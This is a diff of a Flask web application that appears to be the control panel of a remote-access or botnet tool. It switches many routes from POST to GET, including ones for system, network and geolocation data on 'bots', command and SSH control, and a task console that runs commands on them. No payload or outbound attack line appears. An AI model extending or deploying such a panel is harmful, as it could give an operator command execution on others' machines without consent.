@@ -104,7 +104,7 @@ def intel_src():
         return render_template('offline.html', msg=msg)
 
 
-@app.route('/intel/system/src', methods=['POST'])
+@app.route('/intel/system/src', methods=['GET'])
 @login_required
 @bot_required
 def intel_system_src():
@@ -149,7 +149,7 @@ def render_system_data(data):
     return src.format(info)
 
 
-@app.route('/intel/system/data', methods=['POST'])
+@app.route('/intel/system/data', methods=['GET'])
 @login_required
 @bot_required
 def intel_system_data():
@@ -158,7 +158,7 @@ def intel_system_data():
     return jsonify({'resp': src})
 
 
-@app.route('/intel/network/src', methods=['POST'])
+@app.route('/intel/network/src', methods=['GET'])
 @login_required
 @bot_required
 def intel_network_src():
@@ -200,7 +200,7 @@ def render_network_data(data):
     return src.format(info)
 
 
-@app.route('/intel/network/data', methods=['POST'])
+@app.route('/intel/network/data', methods=['GET'])
 @login_required
 @bot_required
 def intel_network_data():
@@ -209,7 +209,7 @@ def intel_network_data():
     return jsonify({'resp': src})
 
 
-@app.route('/intel/geo/src', methods=['POST'])
+@app.route('/intel/geo/src', methods=['GET'])
 @login_required
 @bot_required
 def intel_geo_src():
@@ -263,7 +263,7 @@ def render_geo_data(data):
     return src.format(info)
 
 
-@app.route('/intel/geo/data', methods=['POST'])
+@app.route('/intel/geo/data', methods=['GET'])
 @login_required
 @bot_required
 def intel_geo_data():
@@ -293,7 +293,7 @@ def controls():
         return render_template('offline.html', msg=msg)
 
 
-@app.route('/control/cmd/src', methods=['POST'])
+@app.route('/control/cmd/src', methods=['GET'])
 @login_required
 @bot_required
 def control_cmd_src():
@@ -323,7 +323,7 @@ def control_cmd_cmd():
     return jsonify({'resp': resp})
 
 
-@app.route('/control/ssh/src', methods=['POST'])
+@app.route('/control/ssh/src', methods=['GET'])
 @login_required
 @bot_required
 def control_ssh_src():
@@ -377,7 +377,7 @@ def populate_bot_table():
     return online_bots
 
 
-@app.route('/fetch_bots', methods=['POST'])
+@app.route('/fetch_bots', methods=['GET'])
 @login_required
 def fetch_bots():
     global bots_signature, bots_online_src
@@ -403,7 +403,7 @@ def fetch_bots():
                     'amount': '{:02,}'.format(len(server.interface.bots)), 'status': server.is_active})
 
 
-@app.route('/online_bots_source', methods=['POST'])
+@app.route('/online_bots_source', methods=['GET'])
 @login_required
 def online_bots_source():
     src = '''
@@ -420,7 +420,7 @@ def online_bots_source():
     return jsonify({'resp': src})
 
 
-@app.route('/task_console_source', methods=['POST'])
+@app.route('/task_console_source', methods=['GET'])
 @login_required
 def task_console_source():
     src = '''
@@ -445,7 +445,7 @@ def task_console_cmd():
             resp = server.interface.execute_cmd_by_task_id(cmd_id, args)
     return jsonify({'resp': resp})
 
-@app.route('/account_management', methods=['POST'])
+@app.route('/account_management', methods=['GET'])
 @login_required
 def account_management():
     src = '''
@@ -458,7 +458,7 @@ def account_management():
     '''
     return jsonify({'resp': src})
 
-@app.route('/password_update_source', methods=['POST'])
+@app.route('/password_update_source', methods=['GET'])
 @login_required
 def password_update_source():
     src = '''
@@ -480,7 +480,7 @@ def password_update_source():
     '''
     return jsonify({'resp': src})
 
-@app.route('/username_update_source', methods=['POST'])
+@app.route('/username_update_source', methods=['GET'])
 @login_required
 def username_update_source():
     src = '''
@@ -582,7 +582,7 @@ def server_service():
         if failed:server_stop()
     return jsonify({'resp': 'valid', 'mode': mode, 'failed': failed})
 
-@app.route('/server_service_source', methods=['POST'])
+@app.route('/server_service_source', methods=['GET'])
 @login_required
 def server_service_source():
     if all([server.is_active, not session['server_active']]):
